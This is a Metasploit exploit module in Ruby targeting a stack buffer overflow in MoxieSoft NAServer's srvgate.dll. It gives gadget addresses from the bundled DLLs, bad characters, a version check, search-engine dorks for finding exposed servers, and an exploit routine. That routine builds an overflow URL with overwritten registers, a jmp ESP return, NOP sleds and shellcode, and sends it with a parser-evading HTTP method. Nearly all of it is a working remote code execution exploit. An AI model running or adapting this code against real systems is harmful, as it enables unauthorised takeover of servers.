##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient

# Only works with "bcedit /set nx AlwaysOff"
# OptIn/OptOut and Always on requires a DEP bypass
#
# inurl:/netagent/scripts/srvgate.dll
# inurl:/netagent/scripts/srvproxy.aspx
#
# ----------------------------------------------------------------------------------------------------------------------------------
#  Module info :
# ----------------------------------------------------------------------------------------------------------------------------------
#  Base       | Top        | Size       | Rebase | SafeSEH | ASLR  | NXCompat | OS Dll | Version, Modulename & Path
# ----------------------------------------------------------------------------------------------------------------------------------
#  0x00a60000 | 0x00a87000 | 0x00027000 | True   | False   | False |  False   | False  | 6.0.3.16 [emsmtp.dll] (c:\Program Files (x86)\MoxieSoft\NetAgent Server\emsmtp.dll) # From EasyMail Advanced - http://www.quiksoft.com/support/updates/
#  0x10000000 | 0x10013000 | 0x00013000 | False  | False   | False |  False   | False  | 1.2.3 [zlib1.dll] (C:\Program Files (x86)\MoxieSoft\NetAgent Server\10.0.140.25\bin\zlib1.dll)
#  0x07000000 | 0x07012000 | 0x00012000 | False  | False   | False |  False   | False  | 2.0.2.5 [parse822.dll] (C:\Program Files (x86)\MoxieSoft\NetAgent Server\10.0.140.25\bin\parse822.dll) # From EasyMail Advanced - http://www.quiksoft.com/support/updates/
#  0x05600000 | 0x0561e000 | 0x0001e000 | False  | True    | False |  False   | False  | 1.0.0.1 [emParser.dll] (C:\Program Files (x86)\MoxieSoft\NetAgent Server\10.0.140.25\bin\emParser.dll) # From EasyMail Advanced - http://www.quiksoft.com/support/updates/
#
# Findjmp, Eeye, I2S-LaB
# Findjmp2, Hat-Squad
# Scanning emParser.dll for code useable with the ESP register
# 0x560DFB2       push ESP - ret
# 0x5615E03       jmp ESP
# 0x5616123       jmp ESP
# 0x561619B       jmp ESP
# 0x5616B4B       jmp ESP
# Finished Scanning emParser.dll for code useable with the ESP register
# Found 5 usable addresses
# 
#
# 0x0560a885 : push esp # ret 0x08 |  {PAGE_EXECUTE_READ} [emParser.dll] ASLR: False, Rebase: False, SafeSEH: True, OS: False, v1.0.0.1 (C:\Program Files (x86)\MoxieSoft\NetAgent Server\10.0.140.25\bin\emParser.dll)
# 0x0560aa12 : push esp # ret 0x08 |  {PAGE_EXECUTE_READ} [emParser.dll] ASLR: False, Rebase: False, SafeSEH: True, OS: False, v1.0.0.1 (C:\Program Files (x86)\MoxieSoft\NetAgent Server\10.0.140.25\bin\emParser.dll)
# 0x05602b60 : push esp # ret 0x0c | ascii {PAGE_EXECUTE_READ} [emParser.dll] ASLR: False, Rebase: False, SafeSEH: True, OS: False, v1.0.0.1 (C:\Program Files (x86)\MoxieSoft\NetAgent Server\10.0.140.25\bin\emParser.dll)
# 0x05602eb0 : push esp # ret 0x0c |  {PAGE_EXECUTE_READ} [emParser.dll] ASLR: False, Rebase: False, SafeSEH: True, OS: False, v1.0.0.1 (C:\Program Files (x86)\MoxieSoft\NetAgent Server\10.0.140.25\bin\emParser.dll)
# 0x05603170 : push esp # ret 0x0c | ascii {PAGE_EXECUTE_READ} [emParser.dll] ASLR: False, Rebase: False, SafeSEH: True, OS: False, v1.0.0.1 (C:\Program Files (x86)\MoxieSoft\NetAgent Server\10.0.140.25\bin\emParser.dll)
# 0x0560dfb2 : push esp # ret  |  {PAGE_EXECUTE_READ} [emParser.dll] ASLR: False, Rebase: False, SafeSEH: True, OS: False, v1.0.0.1 (C:\Program Files (x86)\MoxieSoft\NetAgent Server\10.0.140.25\bin\emParser.dll)
# 0x0560a502 : push esp # ret 0x10 |  {PAGE_EXECUTE_READ} [emParser.dll] ASLR: False, Rebase: False, SafeSEH: True, OS: False, v1.0.0.1 (C:\Program Files (x86)\MoxieSoft\NetAgent Server\10.0.140.25\bin\emParser.dll)
# 0x0560fd87 : push esp # ret 0x04 |  {PAGE_EXECUTE_READ} [emParser.dll] ASLR: False, Rebase: False, SafeSEH: True, OS: False, v1.0.0.1 (C:\Program Files (x86)\MoxieSoft\NetAgent Server\10.0.140.25\bin\emParser.dll)
#
#

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'NAServer 9.11 Buffer Overflow (No DEP)',
      'Description'    => %q{
          This exploits a stack buffer overflow in the MoxieSoft NAserver.
          On systems where DEP is not present, we jump straight to shellcode on the stack.
      },
      'Author'         => [ 'Matthew Hall <hallm@sec-1.com>' ], # Vulnerability discovery and MSF Module
      'References'     =>
        [
          [ 'URL', 'http://www.sec-1.com/blog/'],
        ],
      'Privileged'     => true,
      'DefaultOptions' =>
	{
	  'EXITFUNC'  	=> 'thread' 
	},
      'Payload'        =>
        {
          'Space'       => 1700, # About 1754 available
          'DisableNops' => true,
          'BadChars'    => "\x00\x0a\x0d\x7c\x26\x20\xff",
        },
      'Platform'       => 'win',
      'Arch'	       => ARCH_X86, # NAServer is a 32-bit process
      'Targets'        =>
        [
          [
            'Srvgate NAServer',
            {
		# All these work
		#'Ret' => 0x0560a885, # push esp # ret 0x08
		#'Ret' => 0x0560aa12, # push esp # ret 0x08
		#'Ret' => 0x05602b60, # push esp # ret 0x0c
		#'Ret' => 0x05602eb0, # push esp # ret 0x0c
		#'Ret' => 0x05603170, # push esp # ret 0x0c
		#'Ret' => 0x0560fd87, # push esp # ret 0x04
		#'Ret' => 0x0560a502, # push esp, retn 0x10
		#'Ret' => 0x0560DFB2, # push ESP - ret
		#'Ret' => 0x05615E03, # jmp ESP
		#'Ret' => 0x05616123, # jmp ESP
		#'Ret' => 0x0561619B, # jmp ESP
		'Ret' => 0x05616B4B, # jmp ESP
              'Length' => 255, # 1024 - 4 / 8
	      'Offset' => 8 # 8 bytes from EIP to ESP 
            },
          ]
        ],
      'DisclosureDate' => 'Jan 13 2014',
      'DefaultTarget'  => 0))
  end

  def check
    res = send_request_raw({'uri'=>'/netagent/adminasp/adminservice.aspx'}) # Check the base path for version regex
    # Moxie Softwareâ„¢ Channels Administrator 9.1
    # in /netagent/adminasp/adminservice.aspx
    if res and res.body =~ /Administrator 9\.1/ 
      return Exploit::CheckCode::Vulnerable
    end

    return Exploit::CheckCode::Safe
  end

  def nop
    return make_nops(4).unpack("L")[0].to_i
  end

  def exploit
    print_status("Sending request...")

    pload = Rex::Text.uri_encode(payload.encoded)
    nops = Rex::Text.uri_encode(make_nops(target['Offset']))
    morenops = Rex::Text.uri_encode(make_nops(target['Offset'] * 3))
    padding = rand_text_alphanumeric(target['Length'] - 16)

    #print_status('padding encoded: ' + padding)
    #print_status('payload encoded: ' + pload)
    #print_status('nops encoded: ' + nops)

    length = (nops.length + morenops.length + pload.length + nops.length) 
    if length >= payload_space 
	print_error('Payload is larger than we\'re allowed, this is probably going to fail... length is: ' + length.to_s)
    end

    sploit = "/netagent/scripts/srvgate.dll?Action=9099&XMLType=General&Module="
    sploit << padding
    sploit << '@%DDV%01' # overwrite ECX, return to NAServer.<ModuleEntryPoint> - Ensures program continues to run after exit
    sploit << Rex::Text.uri_encode(rand_text_alphanumeric(target['Offset'])) # padding from ECX to EBP 
    sploit << '@%DDV%01' # overwrite EBP, return to NAServer.<ModuleEntryPoint> - Ensures program continues to run after exit
    sploit << Rex::Text.uri_encode([target.ret].pack('V')) # EIP
    sploit << Rex::Text.uri_encode(rand_text_alphanumeric(target['Offset'])) # padding from EIP to ESP
    sploit << nops # ESP has to start with a few nops
    sploit << morenops # With push/retn offset can be several bytes further on
    sploit << pload # Payload here
    sploit << nops # Pad with a few more nops to be nice

    send_request_raw({
      'method' => 'XXX', # Any method works, use this to evade URL parsers
      'uri' => sploit
    }, 5)

    handler
    disconnect
  end

end
